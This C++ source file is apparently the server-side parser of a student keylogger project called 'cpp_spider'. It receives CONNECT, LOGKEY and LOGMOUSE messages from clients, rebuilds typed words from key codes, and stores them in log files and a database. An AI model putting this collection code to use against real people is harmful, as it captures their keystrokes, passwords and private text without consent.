//
// Parser.cpp for Parser in /home/abachelet/Documents/test/cpp_spider
// 
// Made by Adrien Bachelet
// Login   <adrien.bachelet@epitech.eu>
// 
// Started on  Fri Oct  6 15:25:10 2017 Adrien Bachelet
// Last update Sun Oct  8 19:54:00 2017 Adrien Bachelet
//

#include	"Parser.hpp"

Parser::Parser()
{
  this->keywords.insert(std::make_pair("CONNECT", &Parser::connect));
  this->keywords.insert(std::make_pair("LOGKEY", &Parser::keyboard));
  this->keywords.insert(std::make_pair("LOGMOUSE", &Parser::mouse));
  this->keywords.insert(std::make_pair("OK", &Parser::ok));
}

Parser::~Parser()
{
}

void Parser::parseInput(const std::string &input)
{
  std::string		ret;
  std::string		line;
  std::istringstream	iss(input);

  while (std::getline(iss, line))
    {
      std::istringstream	cmd(line);
      if (cmd)
	{
	  std::string	subs;
	  cmd >> subs;
	  if (keywords.find(subs) != keywords.end())
	    {
	      option func = keywords[subs];
	      ret = (this->*func)(&cmd);
	    }
	}
    }
}

std::string	Parser::connect(std::istringstream *input)
{
  std::string	hostname;
  std::string	version;
  std::string	rest;

  if (*input)
    *input >> hostname;
  if (*input)
    {
      *input >> version;
      *input >> rest;
    }
  if (rest != "" || version == "")
    return ("KO\r\n");
  this->id = hostname;
  this->writeInFile(this->id + ".log", "CONNECT " + hostname + " " + version);
  return ("OK\r\n");
}

std::string	Parser::keyboard(std::istringstream *input)
{
  unsigned int	it = 0;
  std::string	keys;
  std::string	token;

  while (*input)
    {
      *input >> token;
      if (this->check_num(token))
	{
	  if (keys == "" && token != "")
	    {
	      unsigned long res = std::stoul(token, NULL, 10);	      
	      std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
	      keys = convert.to_bytes(res);
	      word = word + keys;
	      res = std::stoul(std::string("32"), NULL, 10);
	      if (this->checkSeparator(keys) && word != "")
		{
		  this->writeInFile(this->id + ".log", "LOGWORD = " + this->word);
      this->db.insertDoc(this->id, this->word);
		  word.clear();
		}
	    }
	  else if (*input)
	    keys = keys + " " + token;
	}
      else
	return ("KO\r\n");
      it++;
    }
  if (it < 3)
    return ("KO\r\n");
  this->writeInFile(this->id + ".log", "LOGKEY " + keys);
  return ("OK\r\n");
}

std::string	Parser::mouse(std::istringstream *input)
{
  unsigned int	it = 0;
  std::string	keys;
  std::string	token;

  while (*input)
    {
      *input >> token;
      if (this->check_num(token))
	{
	  if (keys == "" && token != "")
	    keys = token;
	  else if (*input)
	    keys = keys + " " + token;
	}
      else
	return ("KO\r\n");
      it++;
    }
  if (it != 5)
    return ("KO\r\n");
  this->writeInFile(this->id + ".log", "LOGMOUSE " + keys);
  return ("OK\r\n");
}

std::string	Parser::ok(std::istringstream *input)
{
  (void)input;
  return ("OK\r\n");
}

bool		Parser::checkSeparator(const std::string &keys)
{
  std::wstring_convert<std::codecvt_utf8<char32_t>, char32_t> convert;
  if (keys == convert.to_bytes(32) || keys == convert.to_bytes(13) || keys == convert.to_bytes(9))
    return (true);
  return (false);
}

bool		Parser::check_num(const std::string &str)
{
  unsigned int	it = 0;

  while (str != "" && str[it])
    if (!isdigit(str[it++]))
      return (false);
  if (it == 0)
    return (false);
  return (true);
}

bool		Parser::writeInFile(const std::string &file, std::string data)
{
  std::ofstream	saveLog(file, std::ios::app);

  data = data.substr(0, data.find('\r'));
  if (saveLog.is_open())
    {
      std::cout << data << std::endl;
      saveLog << data << '\n';
    }
  else
    return (false);
  return (true);
}
